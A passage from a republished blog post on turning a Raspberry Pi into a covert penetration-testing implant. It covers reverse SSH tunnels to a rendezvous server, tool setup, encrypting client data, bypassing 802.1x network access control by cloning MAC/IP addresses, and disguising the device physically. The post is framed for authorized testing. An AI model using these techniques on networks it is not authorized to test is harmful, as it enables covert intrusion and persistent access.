<!DOCTYPE html>
<html lang="en">
<head>
    <title>
Raspberry Pi as a Penetration Testing Implant (Dropbox) - System Overlord - linksfor.dev(s)    </title>
    <meta charset="utf-8">
    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <meta property="og:title" content="Raspberry Pi as a Penetration Testing Implant (Dropbox) - System Overlord - linksfor.dev(s)"/>
    <meta property="og:description" content="Build a penetration testing dropbox using a Raspberry Pi"/>
    <meta property="og:type" content="website"/>
    <meta property="og:url" content="https://systemoverlord.com/2020/07/14/raspberry-pi-as-a-penetration-testing-implant.html"/>

<meta property="og:site_name" content="linksfor.dev(s)" />
</head>
<body>
    <div class="devring" style="background: #222">
        <div style="text-align:center">Explore other dev related sites in this ring. If you would like to join this ring <a href="https://devring.club">click here</a>.</div>
        <div class="grid">
            <div style="display: grid; grid-template-columns: .5fr 1fr 1fr 1fr; text-align: center;">
                <span class="devring-title"><a href="https://devring.club/">devring.club</a></span>
                <a href="https://devring.club/sites/1/prev" class="devring-previous">Previous</a>
                <a href="https://devring.club/random" class="devring-random">Random</a>
                <a href="https://devring.club/sites/1/next" class="devring-next">Next</a>
            </div>
        </div>
    </div>
    <div class="grid">
        <h1>
<a href="/" style="color:inherit">linksfor.dev(s)</a>
        </h1>
        <title>linksfor.dev(s) - Raspberry Pi as a Penetration Testing Implant (Dropbox) - System Overlord</title>
<div class="readable">
        <h1>Raspberry Pi as a Penetration Testing Implant (Dropbox) - System Overlord</h1>
            <div>Reading time: 23-30 minutes</div>
        <div>Posted here: 17 Jul 2020</div>
        <p><a href="https://systemoverlord.com/2020/07/14/raspberry-pi-as-a-penetration-testing-implant.html">https://systemoverlord.com/2020/07/14/raspberry-pi-as-a-penetration-testing-implant.html</a></p>
        <hr/>
<div id="readability-page-1" class="page"><div>
    <p><a href="https://www.amazon.com/Raspberry-Model-2019-Quad-Bluetooth/dp/B07TC2BK1X/ref=as_li_ss_il?cv_ct_cx=raspberry+pi&amp;dchild=1&amp;keywords=raspberry+pi&amp;pd_rd_i=B07TC2BK1X&amp;pd_rd_r=cf3c4a78-81c5-4c9a-921f-9c70bae2796e&amp;pd_rd_w=XB1nE&amp;pd_rd_wg=PG6Eq&amp;pf_rd_p=1da5beeb-8f71-435c-b5c5-3279a6171294&amp;pf_rd_r=6XKT1T3E2254DKNEXTAY&amp;psc=1&amp;qid=1594437202&amp;sr=1-1-70f7c15d-07d8-466a-b325-4be35d7258cc&amp;linkCode=li3&amp;tag=systemovecom-20&amp;linkId=cf0fb5b6f95cfb61bff474270a0b5ea1&amp;language=en_US"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B07TC2BK1X&amp;Format=_SL250_&amp;ID=AsinImage&amp;MarketPlace=US&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=systemovecom-20&amp;language=en_US" alt="Raspberry Pi 4"></a></p>

<p>Sometimes, especially in the time of COVID-19, you can’t go onsite for a
penetration test.  Or maybe you can only get in briefly on a physical test, and
want to leave behind a dropbox (literally, a box that can be “dropped” in place
and let the tester leave, no relation to the file-sharing company by the same
name) that you can remotely connect to.  Of course, it could also be part of the
desired test itself if incident response testing is in-scope – can they find
your malicious device?</p>

<p>In all of these cases, one great option is a small single-board computer, the
best known of which is the <a href="https://amzn.to/3fl8jSn">Raspberry Pi</a>.  It’s
inexpensive, compact, easy to come by, and very flexible.  It may not be perfect
in every case, but it gets the job done in a lot of cases.</p>

<p>I’ll use this opportunity to discuss the setups I’ve done in the past and the
things I would change when doing it again or alternatives I considered.  I hope
some will find this useful.  Some familiarity with the Linux command line is
assumed.</p>

<!--more-->

<h2 id="table-of-contents">Table of Contents</h2>

<ul id="markdown-toc">
  <li><a href="#general-principles-of-dropboxes" id="markdown-toc-general-principles-of-dropboxes">General Principles of Dropboxes</a></li>
  <li><a href="#connecting-back" id="markdown-toc-connecting-back">Connecting Back</a>    <ul>
      <li><a href="#in-band" id="markdown-toc-in-band">In Band</a></li>
      <li><a href="#out-of-band" id="markdown-toc-out-of-band">Out of Band</a></li>
      <li><a href="#tunnel-software" id="markdown-toc-tunnel-software">Tunnel Software</a></li>
    </ul>
  </li>
  <li><a href="#setup--challenges" id="markdown-toc-setup--challenges">Setup &amp; Challenges</a>    <ul>
      <li><a href="#resiliency" id="markdown-toc-resiliency">Resiliency</a></li>
      <li><a href="#software" id="markdown-toc-software">Software</a></li>
      <li><a href="#confidentialitydata-protection" id="markdown-toc-confidentialitydata-protection">Confidentiality/Data Protection</a></li>
      <li><a href="#network-access-control" id="markdown-toc-network-access-control">Network Access Control</a></li>
      <li><a href="#concealment" id="markdown-toc-concealment">Concealment</a></li>
    </ul>
  </li>
  <li><a href="#other-options" id="markdown-toc-other-options">Other Options</a>    <ul>
      <li><a href="#dedicated-devices" id="markdown-toc-dedicated-devices">Dedicated Devices</a></li>
      <li><a href="#alternative-single-board-computers" id="markdown-toc-alternative-single-board-computers">Alternative Single-Board Computers</a></li>
    </ul>
  </li>
  <li><a href="#related-work" id="markdown-toc-related-work">Related Work</a></li>
</ul>

<h2 id="general-principles-of-dropboxes">General Principles of Dropboxes</h2>

<p>As mentioned above, a dropbox is a device that you can connect to the target
network and leave behind.  (In an authorized test, you’d likely get your
hardware back at the end, but it’s always possible that someone
steals/destroys/etc. your device.)  This serves as your foothold into the target
network.</p>

<p>For some penetration tests, you’ll be able to provide your contact the dropbox
and have them connect it to the network.  This can allow you to have an
internally scoped test but not require your physical presence at their site.
This can be useful to avoid travel costs (or, currently, avoid COVID-19).  In
this case, you’ll have an agreed-upon network segment that it will be connected
to.  (Commonly, this will be a network segment with workstations as opposed to a
privileged segment.)</p>

<p>If you’re going physical and want to leave a dropbox behind, you’ll have to be
more opportunistic about things.  You’ll get whatever network segment you get,
so you might want to consider dropping a couple of devices if the opportunity
presents itself.</p>

<p>In all these cases, you’ll need to remotely control the dropbox over some
network connection, and then operate it to perform your attacks.</p>

<h2 id="connecting-back">Connecting Back</h2>

<p>You’ll almost always want your dropbox to initiate an outbound connection for
remote control.  You’ll almost always be behind NAT or a firewall on the target
network, and dynamic IP addressing would likely make it hard to find your
implant anyway.  There’s two different major approaches: “in band”, where your
command and control (C2) traffic goes out via the target network you’re
connected to, and “out of band” where your C2 is via a separate dedicated
connection.</p>

<h3 id="in-band">In Band</h3>

<p>The easiest approach is to go with an “in band” C2 connection.  In this case,
you tunnel your traffic out on the same physical connection as you’ve connected
to your target network.  This is very straightforward when the right conditions
exist, since you just need power and the one network connection.  Unfortunately,
those right conditions are several:</p>

<ul>
  <li>No Network Access Control, or NAC that allows access to the internet</li>
  <li>Some form of unfettered outbound connection</li>
  <li>DHCP IP Assignment on the segment</li>
</ul>

<p>If any of these fails, you just have a little box connected to a cable that
doesn’t let you do anything.  There are also some <em>risks</em> associated with in
band connections:</p>

<ul>
  <li>Connection might be noticed/detected by Intrusion Detection Systems (IDS)</li>
  <li>Any DNS, etc., traffic would be visible</li>
</ul>

<p>Despite the risks and requirements, this will work in a large majority of use
cases, and it’s both cheap and simple to setup, which makes it both desirable
and the approach I’ve taken nearly every time I’ve setup a Pi-based dropbox.</p>

<h3 id="out-of-band">Out of Band</h3>

<p>For an out of band connection, you need to bring your own network connection to
the dropbox.  Generally, I’ve done that with a WiFi based connection, but
another popular option is to go with a cellular connection.  WiFi is easier to
setup, but obviously has range limitations, while a cellular connection will
<em>usually</em> get you better range.</p>

<p>For WiFi, you can act as a client and connect to a guest or open network from
your target, or perhaps a network of an adjacent office.  Alternatively, you
could run an AP mode, but then you need to stay in a relatively close range to
be able to connect to your dropbox.  (The AP mode really only works if you’re
able to put it near a window or you can stay nearby, say in a shared office
space.)</p>

<p><a href="https://www.amazon.com/ZTE-MF833V-Customized-Version-Covering/dp/B07XXBQPZL/ref=as_li_ss_il?dchild=1&amp;keywords=cellular+dongle&amp;qid=1594436300&amp;sr=8-4&amp;linkCode=li2&amp;tag=systemovecom-20&amp;linkId=a7668cc52205a17e12f51fdf9e825298&amp;language=en_US"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B07XXBQPZL&amp;Format=_SL160_&amp;ID=AsinImage&amp;MarketPlace=US&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=systemovecom-20&amp;language=en_US" alt="USB Cellular Dongle"></a></p>

<p>For a cellular connection, the most popular option is a USB dongle that you
insert a SIM card into.  The nicer dongles will act like an ethernet network interface
(typically via <a href="https://en.wikipedia.org/wiki/RNDIS">RNDIS</a>) to give you a
minimum amount of configuration, and generally will work out of the box with
Linux, whereas other dongles may be a little harder to get working.  I’ve used
the <a href="https://amzn.to/38LEyI0">ZTE MF833V</a> with success in the past.</p>

<h3 id="tunnel-software">Tunnel Software</h3>

<p>Regardless of how you connect back, you probably need some kind of tunneling
software for the connection.  (The exception being the case where you setup an
AP on the Pi and connect directly to it.)</p>

<p>Pretty much all of these require a server as some kind of “meeting point” where
both the dropbox(es) and the operator(s) connect.  This gives the dropboxes a
static IP or hostname to connect to that’s online all the time, and allows
operator(s) behind NAT/firewalls to connect in.  I use
<a href="https://m.do.co/c/b2cffefc9c81">DigitalOcean</a> to host servers for projects (as
well as this blog – and if you use my link, you’ll get $100 in free credit for
new users as well as support articles like this), but you can of course use any
server or VPS that you have.</p>

<p>My favorite approach is actually using <code>ssh</code> to establish an outbound connection
that forwards a port back to the dropbox for its own SSH server.  I realize this
sounds confusing, so I hope this diagram helps:</p>

<p><img src="https://systemoverlord.com/img/pi_dropbox/tunneling.png" alt="SSH Tunnels"></p>

<p>This is done with a command similar to the following, where then connecting to
port <code>2222</code> on the server will establish a connection to the dropbox’s port <code>22</code>.
If you have multiple dropboxes, assign each one a different port on the server,
or use <code>0</code> for port auto assignment.  When using that, you’ll likely need to use
<code>netstat</code> to find the associated ports.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>ssh -R 2222:localhost:22 server.example.com
# or using automatic port assignment and going to the background
ssh -f -N -R 0:localhost:22 server.example.com
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you do this on a server and then are connecting from a remote client (e.g.,
your laptop), you can use the <code>ssh</code> <code>ProxyJump</code> feature to connect to the
dropbox through the server.  For example, using the example port <code>2222</code>, the
following will connect to the dropbox (note the use of <code>localhost</code> to connect to
the forwarded port):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>ssh -J server.example.com -p 2222 root@localhost
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Unfortunately, this may result in multiple layers of TCP, so throughput will be
sub-optimal, but it works well, and I can run an SSH server on Port 443, which
is effective for any network that allows HTTPS out without SSL interception.
(Almost nobody, it turns out, does any kind of inspection to confirm that
443/tcp traffic is actually TLS.)</p>

<p>I recommend using a tool like <a href="https://www.harding.motd.ca/autossh/"><code>autossh</code></a>
to manage your SSH connection in case the connection drops.  You’ll also want to
enable keepalives to both ensure the connection stays up longer, and also to
enable <code>autossh</code> to more easily detect a loss of connectivity.</p>

<p>The other alternative I can recommend is to use a VPN.  Previously, I would have
used OpenVPN, but I have become a <a href="https://www.wireguard.com/">WireGuard</a>
convert, especially for lower powered devices like the Raspberry Pi.  (The
crypto used by WireGuard can sustain higher throughput on low-end devices.)  The
biggest downside to this is you’ll need to run UDP out, so it can be a little
harder if you’re going with the “in band” approach on a restrictive network.</p>

<h2 id="setup--challenges">Setup &amp; Challenges</h2>

<p>One of the keys is to have your dropbox ready to go when you deploy it.
Depending on your approach, someone else might be deploying it (if a remote
engagement, or if someone else is doing your physical testing), you might not
have much time, or there might be other constraints.  In any case, you want to
make sure it’s ready to go when you are.</p>

<p>Among other things, this means having the tools you’ll want already set up (you
don’t want to waste time and bandwidth installing new tools once the dropbox is
in place), having your connection(s) set up, and having contingency plans in
case something goes wrong.</p>

<p>One way to have a lot of tools ready to go is to use one of the ARM images for
<a href="https://www.offensive-security.com/kali-linux-arm-images/">Kali Linux</a> provided
by Offensive Security.  They’re not perfect, but they’re a great jumping off
point for your own custom image.  Alternatively, you can install the tools you
want on a base <a href="https://www.raspberrypi.org/downloads/">Raspberry Pi OS</a>
(formerly Raspbian) image.  It really depends on what you’re comfortable with.</p>

<p>My general approach is to write the base image to the SD card and load up a
Raspberry Pi.  I’ll configure authentication (passwords and keys), install the
software I want, and setup the connection back to my remote server.  Once I have
things working properly, I’ll make a full image backup of the SD card.  Usually
I do something like the following to make the backup, assuming the SD card is
<code>/dev/mmcblk0</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>dd if=/dev/mmcblk0 bs=4M | bzip2 -9 &gt; sdcard.img.bz2
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The compression helps because, at this point, the card will be mostly empty so
there’s no point in taking up space with all the blank blocks.</p>

<h3 id="resiliency">Resiliency</h3>

<p>If you’re going to rely on this dropbox as your primary way into a target
network, you want to make sure it’s as reliable and resilient as possible.
There’s some things you just won’t be able to control for, like hardware
failure, someone finding your dropbox, or the network port you’re connected to
going dark on you.  (Placing more than one device, of course, can be insurance
against all of those.)</p>

<p>One common complaint with Raspberry Pis in any situation has to do with
filesystem corruption from unclean shutdown and incomplete writes to the SD
cards.  I’ve done some experimentation with this and found some ways to reduce
the risk, but nothing I’ve tried or read will completely eliminate it.</p>

<p><a href="https://www.amazon.com/Samsung-Electronics-microSDXC-Adapter-MB-ME256HA/dp/B0887P21Z2/ref=as_li_ss_il?dchild=1&amp;keywords=samsung+evo+pro+micro+sd&amp;qid=1594512037&amp;sr=8-3&amp;linkCode=li2&amp;tag=systemovecom-20&amp;linkId=940472fbe3ebdf26566393c7ef6a5c3b&amp;language=en_US"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B0887P21Z2&amp;Format=_SL160_&amp;ID=AsinImage&amp;MarketPlace=US&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=systemovecom-20&amp;language=en_US" alt="MicroSD Card"></a></p>

<p>One way to reduce the risk of corruption is to use a quality SD card.  While
incomplete writes can be a problem with any card, it seems that some cards are
more prone to data loss than others.  Maybe this has to do with erase block
size, or with reporting writes as finished before they’re done, or with
wear-leveling strategies.  It’s not clear to me what the difference is, but my
greatest level of success has been with <a href="https://amzn.to/2DzCBD5">Samsung Evo</a>
MicroSD cards.  I’ve also had good luck with <a href="https://amzn.to/2OhuEEB">PNY</a> SD
cards, even though they’re a somewhat lesser known brand.</p>

<p>Another way to reduce corruption is to minimize writes to the filesystem when
it’s running.  This is another benefit of having the software pre-installed and
configured – you know those writes won’t be what corrupts your filesystem.
Mounting <code>/var/log</code> and <code>/tmp</code> as <code>tmpfs</code> helps a lot as well, but does limit
what you can store there based on how much RAM the Pi you’re using has.  (This
was a significant limitation on versions before the Pi 4B.)  Alternatively, you
can give them a separate partition, so at least if the filesystem is corrupted,
you don’t lose your root filesystem at the same time.</p>

<p>You can configure the <code>tmpfs</code> option by adding lines to <code>/etc/fstab</code> like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>echo 'tmpfs /tmp tmpfs rw,nodev,noexec,nosuid,size=256M,mode=1700 0 0' &gt;&gt; /etc/fstab
echo 'tmpfs /var/log tmpfs rw,nodev,noexec,nosuid,size=256M,mode=750 0 0' &gt;&gt; /etc/fstab
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Another area to consider for reliability is your command and control system.
Regardless of your C2 strategy, you may want to consider implementing a backup
communications system, such as a slow, infrequently-polling DNS based mechanism.
This both provides an alternate in case your primary mechanism fails, and can
use a different network interface as a backup.</p>

<p>Yet another concern is the temporary failure of your network link.  Having some
kind of watchdog to restart your network connection when it can’t reach your
server may prove useful.</p>

<h3 id="software">Software</h3>

<p>The exact software you need will depend on the type of engagement you’re
performing.  At a minimum, you’ll always need your connection for control of the
device, and you’ll want some tools for network enumeration and attacks.  You
probably also want a way to tunnel arbitrary traffic, either via SSH port
forwards or SOCKS proxy emulation, or a full proxy on the device.  I usually
build mine with at least the following:</p>

<ul>
  <li>SSH</li>
  <li>tmux/screen</li>
  <li>Wireguard</li>
  <li>nmap</li>
  <li>tshark/tcpdump</li>
  <li>Metasploit</li>
  <li>bettercap</li>
</ul>

<p>Depending on your engagement, you might want some things like pre-built payloads
for various circumstances.</p>

<h3 id="confidentialitydata-protection">Confidentiality/Data Protection</h3>

<p>Like everything else you do as a penetration tester or red teamer, it’s
important to protect your client’s data.  Whatever you choose to use for your
control connection should be encrypted, but it’s also a good idea to encrypt any
sensitive data that’s at rest on the dropbox in case someone locates it and
takes it (and feels like examining the contents of the SD card).</p>

<p>One obvious option is to encrypt everything, such as with full-disk encryption,
but since you won’t be able to unlock the device on boot, this isn’t as easy an
option.  There are ways to remotely unlock with an SSH server in an <code>initramfs</code>,
but that adds complexity and risk of failures.</p>

<p>Instead, having a dedicated data partition that’s encrypted is a good tradeoff
that will still offer protection for the data in the case the SD card is
examined.  I like to use LUKS for this – it’s easy enough to setup and
well-studied for the use case.  Unfortunately, Broadcom didn’t license the ARM
crypto extensions, so performance is not great, but XTS mode is a couple of
times faster than <code>CBC</code> mode, so make sure you use that.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre>% cryptsetup benchmark
#     Algorithm |       Key |      Encryption |      Decryption
        aes-cbc        128b        23.8 MiB/s        77.6 MiB/s
        aes-cbc        256b        17.2 MiB/s        58.9 MiB/s
        aes-xts        256b        85.0 MiB/s        75.1 MiB/s
        aes-xts        512b        65.4 MiB/s        57.4 MiB/s
</pre></td></tr></tbody></table></code></pre></div></div>

<p>(Benchmarks taken from a Raspberry Pi 4B with 4GB of RAM.)</p>

<p>Depending on your threat model, you can either mount with a random key on each
boot (so if the device is rebooted, all data is lost, including for you), or
mount the encrypted partition on the first connection after each boot using a
key stored either on your server or your client machines.</p>

<p>Let’s say you want to encrypt all the data to be stored in <code>/data</code> with a random
key in each boot, and you’re using <code>/dev/mmcblk0p3</code> as the underlying partition
to be used to store the data.  (This is after the <code>/boot</code> and <code>/</code> partitions on
the SD card.)  You’ll need to setup <code>/etc/crypttab</code> to enable the encryption and
<code>/etc/fstab</code> for the filesystem mounting.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>mkdir /data
echo 'datacrypt /dev/mmcblk0p3 /dev/urandom cipher=aes-xts-plain64:sha256,size=256,nofail,tmp' &gt;&gt; /etc/crypttab
echo '/dev/mapper/datacrypt /data ext4 defaults,noatime 0 0' &gt;&gt; /etc/fstab
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To unlock <code>/data</code> using a remote key, we won’t use <code>crypttab</code>, but instead
invoke <code>cryptsetup</code> directly and then mount the encrypted partition.  First,
there’s one-time setup:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>mkdir /data
chmod 000 /data
echo '/dev/mapper/datacrypt /data ext4 defaults,noatime 0 0' &gt;&gt; /etc/fstab
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then copy the following script to <code>/root/cryptsetup.sh</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td><pre><span>#!/bin/bash</span>

<span>set</span> <span>-ue</span>

<span>DEVICE</span><span>=</span>/dev/mmcblk0p3
<span>NAME</span><span>=</span><span>"datacrypt"</span>

<span>case</span> <span>"</span><span>${</span><span>1</span><span>:-</span><span>unlock</span><span>}</span><span>"</span> <span>in
  </span>create<span>)</span>
    <span>FIFOD</span><span>=</span><span>$(</span><span>mktemp</span> <span>-d</span><span>)</span>
    <span>trap</span> <span>"rm -rf </span><span>${</span><span>FIFOD</span><span>}</span><span>"</span> SIGINT SIGTERM ERR EXIT
    <span>mkfifo</span> <span>${</span><span>FIFOD</span><span>}</span>/f1
    <span>mkfifo</span> <span>${</span><span>FIFOD</span><span>}</span>/f2
    <span>(</span>
        cryptsetup luksFormat <span>-b</span> 256 <span>-c</span> aes-xts-plain64 <span>"</span><span>${</span><span>DEVICE</span><span>}</span><span>"</span> <span>${</span><span>FIFOD</span><span>}</span>/f1
        cryptsetup luksOpen <span>--key-file</span> <span>${</span><span>FIFOD</span><span>}</span>/f2 <span>"</span><span>${</span><span>DEVICE</span><span>}</span><span>"</span> <span>"</span><span>${</span><span>NAME</span><span>}</span><span>"</span>
        mkfs.ext4 <span>"/dev/mapper/</span><span>${</span><span>NAME</span><span>}</span><span>"</span>
        mount <span>"/dev/mapper/</span><span>${</span><span>NAME</span><span>}</span><span>"</span>
    <span>)</span> &amp;
    <span>tee</span> <span>${</span><span>FIFOD</span><span>}</span>/f1 | <span>tee</span> <span>${</span><span>FIFOD</span><span>}</span>/f2 <span>&gt;</span>/dev/null
    <span>wait
    echo</span> <span>"Successfully created."</span>
    <span>;;</span>
  unlock<span>)</span>
    cryptsetup luksOpen <span>--key-file</span> - <span>"</span><span>${</span><span>DEVICE</span><span>}</span><span>"</span> <span>"</span><span>${</span><span>NAME</span><span>}</span><span>"</span>
    mount /dev/mapper/datacrypt
    <span>echo</span> <span>"Successfully unlocked/mounted."</span>
    <span>;;</span>
  <span>*</span><span>)</span>
    <span>echo</span> <span>"Unknown operation!"</span> <span>&gt;</span>/dev/stderr
    <span>exit </span>1
    <span>;;</span>
<span>esac</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This script uses key data provided over standard input to either create or
unlock the data partition.  Then you can unlock the data partition remotely by
running the script:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>dd </span><span>if</span><span>=</span>/dev/urandom <span>of</span><span>=</span>keyfile <span>bs</span><span>=</span>64 <span>count</span><span>=</span>1
<span># Create the filesystem</span>
ssh root@raspberrypi /root/cryptsetup.sh create &lt; keyfile
<span># Mount the filesystem on subsequent boots</span>
ssh root@raspberrypi /root/cryptsetup.sh &lt; keyfile
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="network-access-control">Network Access Control</h3>

<p>If you’re unlucky, you’ll wind up on a network port with <a href="https://en.wikipedia.org/wiki/Network_Access_Control">Network Access
Control</a>.  Obviously, if
you’re doing a coordinated remote test where the dropbox is placed by the IT
staff of the target organization, this can be dealt with administratively.
However, if you’re on a penetration test where the dropbox is opportunistic/part
of the physical engagement, then this may be something you need to overcome.</p>

<p>One way to address this is just to find ports that are not configured for any
form of NAC.  While that sounds like it might be a long ask, there’s usually
plenty on the network that’s not dealing with the NAC implementation.  Printers,
cameras, “IoT” devices and more may all not be capable of interfacing with the
NAC solution.  You can find an unused port, replace a device (with the increased
risk of detection that brings), add your own network switch (I like these little
<a href="https://amzn.to/3iWQiMm">USB-powered switches</a>), or use a 2nd wired network
interface on the dropbox.  (On the Pi, this will need to be connected via USB.)</p>

<p>For MAC- or <a href="https://en.wikipedia.org/wiki/IEEE_802.1X">802.1x</a>-based NAC, a
good approach is the use of two network interfaces bridged together.  In both
cases, the goal is to make your implant indistinguishable from the legitimate
host on the network.  Sometimes it’s enough to have to have the port activated
by the legitimate client, but other times you’ll need to clone the MAC and IP of
the device, which requires some network tricks.</p>

<p>For <code>802.1x</code>, you’ll need to configure the bridge to pass the EAPOL frames as
well.  This can be done by setting an option in a <code>sysfs</code> file for the bridge:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>echo 8 &gt; /sys/class/net/br*/bridge/group_fwd_mask
</pre></td></tr></tbody></table></code></pre></div></div>

<p>You can configure a transparent firewall setup or use a tool like
<a href="https://github.com/Orange-Cyberdefense/fenrir-ocd">FENRIR</a> to inject traffic
using spoofed MAC/IP settings.  The exact requirements depend on the <code>802.1x</code>
setup, but in the best case, once the port is enabled by the switch, all traffic
on it will be allowed until the next link down.</p>

<p>Dealing with custom or more complex NAC requirements is left as an exercise for
the reader.</p>

<h3 id="concealment">Concealment</h3>

<p>If this is an overt test, there’s no need to worry about concealment.  On the
other hand, for a covert test, there’s two main classes of concealment to be
concerned about: digital concealment (network detection), and physical
concealment.</p>

<p>For network concealment, a lot of the steps in the <a href="#network-access-control">Network Access
Control</a> section will help, including cloning expected
IP and MAC addresses.  Additionally, putting minimal amounts of unexpected
network traffic on the target network will help maintain stealth.</p>

<p>From a physical point of view, you basically have a couple of options: hidden or
inconspicuous.  Hidden is simple: place your dropbox behind something (e.g., a
user’s PC, a printer, etc.) or in some other concealed location.  I’ve
personally discovered a Raspberry Pi above the false ceiling in a men’s room,
connected to the “Guest” wireless network.  (It wasn’t actually malicious, but
part of a pilot program, but still a strange place to find a Raspberry Pi…)</p>

<p><a href="https://www.amazon.com/Vilros-Raspberry-Heavy-Aluminum-Cooling/dp/B07XVPH79R/ref=as_li_ss_il?dchild=1&amp;keywords=raspberry+pi+4+case+aluminum&amp;qid=1594530386&amp;sr=8-9&amp;linkCode=li2&amp;tag=systemovecom-20&amp;linkId=04b6450c51be142359814bbf21cbada6&amp;language=en_US"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B07XVPH79R&amp;Format=_SL160_&amp;ID=AsinImage&amp;MarketPlace=US&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=systemovecom-20&amp;language=en_US" alt="Raspberry Pi Case"></a></p>

<p>For something that blends in, you want something nobody will think twice about.
This depends a lot on your environment, so as per usual with offensive security,
recon is critical and the devil’s in the details, but a few thoughts:</p>

<ul>
  <li>Make it look like an appliance</li>
  <li>Make it part of the environment (look like other things present)</li>
  <li>Give it a plausible reason to exist</li>
</ul>

<p>I’m a big fan of non-descript cases like <a href="https://amzn.to/2ZlUC03">this</a> and
<a href="https://amzn.to/2WakslE">this</a>.  I’m also a fan of misdirection in case the
device is seen.  For example, sticking a label on the device to identify it as
an “Air Quality Monitor” or something equally benign.  A bold choice is to
include an email address like <code>&lt;healthandsafety@customer.com&gt;</code>.  It lends an air
of credence to it, but should someone actually take it upon themselves to check
with that email address, their suspicions may be aroused if the email bounces.</p>

<h2 id="other-options">Other Options</h2>

<p>Obviously, a Raspberry Pi is not the only type of device that you can use as an
offensive security dropbox.  There exist a handful of dedicated devices as well
as a wide range of other single-board computers that can be used.  The Raspberry
Pi, however, is relatively cheap, easy to come by, well-documented, and with a
broad software ecosystem.</p>

<h3 id="dedicated-devices">Dedicated Devices</h3>

<p>There are a few dedicated penetration testing devices out there.  If you’re in
this industry, you’re no doubt familiar with Hak5’s products.  I’m a big fan of
the <a href="https://shop.hak5.org/collections/sale/products/packet-squirrel">Packet
Squirrel</a> as a
network implant, particularly when you need to do an inline
<a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM</a>, but it has
nowhere near the ecosystem nor the processing power available in a Raspberr Pi.
Additionally, I’ve never been able to get an out-of-band networking system
working on.  (Maybe I should give it another try…)</p>

<p>The <a href="https://acehackware.com/products/ace-r00tabaga-multipwner?variant=19922794692">Ace Hackware
Rootabaga</a>
is another dedicated hardware implant, based on the TP-LINK MR3040, which is a
small WiFi router using OpenWRT as the base of the firmware.  While it claims to
be a competitor to the WiFi Pineapple, the firmware is not nearly as current.
It definitely lacks the ecosystem available to the Raspberry Pi (either with
Debian or Kali) and is significantly less powerful.  The one big advantage to
the Rootabaga is it’s built-in battery, though it only lasts hours, so you may
need to plan around that.</p>

<p>If the battery of the Rootabaga sounds attractive, you could pair a Pi with a
<a href="https://click.linksynergy.com/deeplink?id=aIjkt7dUnp0&amp;mid=43469&amp;murl=https%3A%2F%2Fwww.anker.com%2Fproducts%2Fvariant%2Fpowercore--26800%2FA1374011">battery bank – the bigger, the
better</a>.
A 26.8Ah battery offers nearly 100Wh of energy.  Given a typical power
consumption of a bit under 2.5W from a Pi, you can keep going for ~40 hours on
the battery.  Alternatively, if PoE is available, you can put the official
Raspberry Pi <a href="https://amzn.to/3gT3sbK">PoE hat</a> on the dropbox and run from
that.  Unfortunately, I’m not aware of any way to pass PoE through, so you won’t
be able to use that if you need to go inline on a device that’s already
PoE-powered.</p>

<h3 id="alternative-single-board-computers">Alternative Single-Board Computers</h3>

<p>Since the inception of the Raspberry Pi, there has been a whole ecosystem of
clones, with names like <a href="http://www.banana-pi.org/">BananaPi</a> and
<a href="http://www.orangepi.org/">OrangePi</a>, but these don’t offer you much.  They have
a smaller set of documentation, a smaller set of ready-made software and
distributions, and the hardware capabilities are much the same as the Raspberry
Pi.  It’s actually rather amazing to me how many different variants have cropped
up, so if one fits your needs, you may want to consider it.</p>

<p><a href="https://www.amazon.com/Globalscale-Technologies-Inc-ESPRESSOBIN-Enclosure/dp/B07KTMBCS1/ref=as_li_ss_il?dchild=1&amp;keywords=espressobin&amp;qid=1594581889&amp;sr=8-3&amp;linkCode=li2&amp;tag=systemovecom-20&amp;linkId=2b73d0fe01b1ac06a925afd0a7a4f627&amp;language=en_US"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B07KTMBCS1&amp;Format=_SL160_&amp;ID=AsinImage&amp;MarketPlace=US&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=systemovecom-20&amp;language=en_US" alt="EspressoBin"></a></p>

<p>In terms of alternatives that offer benefits, there’s a couple of things I’ve
looked for, mostly related to connectivity.  Most prominent is multiple ethernet
interfaces, like you can find on the <a href="https://amzn.to/3gPfd2L">EspressoBin</a> or a
